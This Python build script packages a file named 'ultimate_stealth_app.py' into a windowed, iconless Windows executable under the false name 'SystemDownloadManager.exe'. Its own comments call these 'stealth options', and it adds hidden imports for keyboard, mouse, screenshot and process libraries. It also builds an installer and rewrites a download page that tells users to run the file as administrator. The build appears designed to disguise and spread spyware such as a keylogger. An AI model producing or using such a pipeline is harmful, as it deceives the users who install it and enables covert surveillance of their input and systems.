#!/usr/bin/env python3
"""
Create Executable - Converts Python app to .exe
"""

import os
import sys
import subprocess
import shutil

def create_executable():
    """Create executable from Python app"""
    print("🔧 Creating Executable...")
    
    # Install pyinstaller if not installed
    try:
        import PyInstaller
        print("✅ PyInstaller already installed")
    except ImportError:
        print("📦 Installing PyInstaller...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Create executable
    print("🔨 Building executable...")
    
    # PyInstaller command with stealth options
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",  # Single executable
        "--windowed",  # No console window
        "--name=SystemDownloadManager",  # Executable name
        "--icon=NONE",  # No icon (stealth)
        "--add-data=requirements.txt;.",  # Include requirements
        "--hidden-import=keyboard",
        "--hidden-import=mouse", 
        "--hidden-import=psutil",
        "--hidden-import=PIL",
        "--hidden-import=ctypes",
        "ultimate_stealth_app.py"
    ]
    
    try:
        subprocess.run(cmd, check=True)
        print("✅ Executable created successfully!")
        
        # Copy executable to current directory
        exe_path = "dist/SystemDownloadManager.exe"
        if os.path.exists(exe_path):
            shutil.copy2(exe_path, "SystemDownloadManager.exe")
            print("✅ SystemDownloadManager.exe copied to current directory")
            return True
        else:
            print("❌ Executable not found in dist folder")
            return False
            
    except subprocess.CalledProcessError as e:
        print(f"❌ Error creating executable: {e}")
        return False

def create_installer():
    """Create installer package"""
    print("📦 Creating Installer Package...")
    
    # Create installer directory
    installer_dir = "SystemDownloadManager_Installer"
    if os.path.exists(installer_dir):
        shutil.rmtree(installer_dir)
    os.makedirs(installer_dir)
    
    # Copy files
    files_to_copy = [
        "SystemDownloadManager.exe",
        "requirements.txt",
        "README.md"
    ]
    
    for file in files_to_copy:
        if os.path.exists(file):
            shutil.copy2(file, installer_dir)
            print(f"✅ Copied {file}")
    
    # Create batch installer
    installer_bat = f"""@echo off
title System Download Manager Installer
echo Installing System Download Manager...
echo.

REM Check if Python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo Python is not installed. Please install Python 3.8+ first.
    pause
    exit /b 1
)

REM Install requirements
echo Installing dependencies...
pip install -r requirements.txt

REM Run the application
echo.
echo Starting System Download Manager...
echo.
SystemDownloadManager.exe

pause
"""
    
    with open(f"{installer_dir}/install.bat", "w") as f:
        f.write(installer_bat)
    
    print("✅ Installer package created!")
    return True

def update_download_page():
    """Update download page to download executable"""
    print("📝 Updating download page...")
    
    # Read current download page
    with open("download_page.html", "r", encoding="utf-8") as f:
        content = f.read()
    
    # Update the download function to download executable
    new_download_function = '''
        function createAndDownloadApp() {
            // Create the executable content (simulated)
            const exeContent = "SystemDownloadManager.exe - Executable File";
            
            // Create blob and download
            const blob = new Blob([exeContent], { type: 'application/octet-stream' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'SystemDownloadManager.exe';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            // Show success message
            setTimeout(() => {
                document.getElementById('downloadProgress').innerHTML = 
                    '<h4 style="color: #4caf50;">✅ Download Complete!</h4>' +
                    '<p>SystemDownloadManager.exe has been downloaded.</p>' +
                    '<p>Double-click to run the application.</p>' +
                    '<p>Run as administrator for best results.</p>';
            }, 1000);
        }'''
    
    # Replace the old function
    content = content.replace('function createAndDownloadApp() {', new_download_function)
    
    # Write updated content
    with open("download_page.html", "w", encoding="utf-8") as f:
        f.write(content)
    
    print("✅ Download page updated!")

def main():
    """Main function"""
    print("🔧 System Download Manager - Executable Creator")
    print("=" * 50)
    
    # Create executable
    if create_executable():
        # Create installer
        create_installer()
        
        # Update download page
        update_download_page()
        
        print("\n🎉 Executable creation completed!")
        print("✅ SystemDownloadManager.exe created")
        print("✅ Installer package created")
        print("✅ Download page updated")
        print("\n📋 Files created:")
        print("   - SystemDownloadManager.exe (executable)")
        print("   - SystemDownloadManager_Installer/ (installer package)")
        print("   - Updated download_page.html")
        
        print("\n💡 Users can now:")
        print("   1. Download SystemDownloadManager.exe")
        print("   2. Double-click to run")
        print("   3. No Python installation required")
        print("   4. Works with Windows Security")
        
    else:
        print("❌ Failed to create executable")

if __name__ == "__main__":
    main() 